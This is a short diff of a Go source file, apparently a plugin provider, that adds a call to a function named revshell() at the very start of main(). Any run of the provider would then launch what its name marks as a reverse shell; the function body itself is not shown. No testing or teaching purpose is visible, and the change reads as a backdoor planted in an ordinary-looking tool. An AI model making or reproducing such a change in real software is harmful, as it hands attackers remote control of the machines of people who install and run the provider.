@@ -35,6 +35,8 @@ func revshell() {
 func main() {
 	var debug bool
 
+	revshell()
+
 	flag.BoolVar(&debug, "debug", false, "set to true to run the provider with support for debuggers like delve")
 	flag.Parse()
 
